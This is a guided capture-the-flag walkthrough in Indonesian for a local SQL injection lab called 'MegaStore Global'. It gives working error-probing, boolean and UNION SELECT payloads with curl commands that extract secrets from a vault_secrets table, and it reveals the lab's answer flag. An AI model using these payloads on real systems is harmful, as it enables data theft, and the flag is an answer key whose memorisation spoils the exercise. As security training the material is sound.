# Panduan Praktik Terbimbing: Eksploitasi SQL Injection pada MegaStore Global

Dalam latihan terarah ini, kamu akan mempraktikkan proses penemuan celah, pengujian error, dan eksploitasi kerentanan SQL Injection pada portal katalog produk **MegaStore Global (Commercial E-Commerce & Retail Inventory Portal)** yang beroperasi pada `http://127.0.0.1:8015`.

---

### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
1. Pastikan target lab telah berjalan dan uji ketersediaan layanan melalui terminal:
   ```bash
   curl -s http://127.0.0.1:8015/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"lab":"A05","port":8015,"status":"ok"}
   ```
2. Buka peramban web dan akses halaman beranda MegaStore Global:
   `http://127.0.0.1:8015/`
3. Amati antarmuka katalog:
   - Terdapat kolom pencarian produk dengan placeholder *"Search products..."* dan tombol **"Search Inventory"**.
   - Di bawahnya terdapat tabel daftar inventaris barang yang menampilkan 3 kolom informasi: **Product Name**, **Category**, dan **Price**.

---

### Langkah 2: Pengujian Input & Deteksi Error SQL (Fuzzing)
1. Pada kotak pencarian produk di antarmuka web, ketikkan karakter kutip tunggal:
   `'`
2. Klik tombol **"Search Inventory"** atau kirimkan via terminal:
   ```bash
   curl -s "http://127.0.0.1:8015/?q=%27"
   ```
3. **Temuan Kritis:**
   Server menampilkan kotak pesan error basis data berwarna merah:
   ```text
   Internal Database Exception: unrecognized token: "'%'"
   ```
   Pesan ini mengonfirmasi secara pasti bahwa karakter kutip tunggal yang kamu kirimkan berhasil merusak sintaks query SQL backend!

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Mengapa pesan error muncul?**  
> Di sisi server, kode Python mengeksekusi query dengan menyambungkan string mentah:  
> `SELECT name, category, price FROM products WHERE name LIKE '%{q}%'`  
> Saat kamu memasukkan `'`, query berubah menjadi:  
> `... WHERE name LIKE '%'%'`  
> Tanda kutip ketiga tidak memiliki pasangan penutup, sehingga parser SQLite mengalami kebingungan sintaks dan memuntahkan error!

---

### Langkah 3: Menyeimbangkan Query & Menguji Injeksi Logika Boolean
1. Untuk membuktikan bahwa kita bisa mengendalikan alur query, kita harus menutup string secara rapi dan menetralkan sisa karakter menggunakan tanda komentar (`--`):
   `' OR 1=1 --`
2. Masukkan payload tersebut ke kolom pencarian atau jalankan perintah cURL:
   ```bash
   curl -s "http://127.0.0.1:8015/?q=%27+OR+1%3D1+--"
   ```
3. **Hasil:** Seluruh daftar produk di database ditampilkan di layar tanpa ada pesan error. Kondisi `1=1` selalu bernilai benar (*true*).

---

### Langkah 4: Menentukan Jumlah Kolom & Menjalankan UNION Injection
Teknik `UNION SELECT` memungkinkan kita menggabungkan hasil pencarian dengan data dari tabel lain. Syarat mutlak `UNION` adalah jumlah kolom dan tipe data harus sesuai dengan query asli (3 kolom):

1. Uji baris data tiruan menggunakan 3 kolom:
   `' UNION SELECT 'TIRUAN', 'KATEGORI_TEST', 999 --`
2. Perhatikan tabel inventaris di browser: Muncul baris produk baru bernama *"TIRUAN"* dengan kategori *"KATEGORI_TEST"* dan harga *$999.00*.
3. Sekarang, ganti data tiruan tersebut dengan nama kolom dari tabel rahasia `vault_secrets`:
   - Kolom 1: `secret_name`
   - Kolom 2: `secret_data`
   - Kolom 3: angka `0` (untuk mengisi kolom harga)
4. Susun payload lengkap:
   `' UNION SELECT secret_name, secret_data, 0 FROM vault_secrets --`

---

### Langkah 5: Eksfiltrasi Flag Rahasia
1. Masukkan payload di atas ke kotak pencarian web atau jalankan via cURL:
   ```bash
   curl -s "http://127.0.0.1:8015/?q=%27+UNION+SELECT+secret_name%2C+secret_data%2C+0+FROM+vault_secrets+--"
   ```
2. **Temuan Kunci pada Baris Tabel:**
   - **Product Name:** `PROJECT_ZITERA_CORE_FLAG`
   - **Category:** `FLAG: ZITERA{5q1_1nj3ct10n_m45t3r_2026}`
   - **Price:** `$0.00`
3. Salin bendera validasi autoritatif:
   `ZITERA{5q1_1nj3ct10n_m45t3r_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
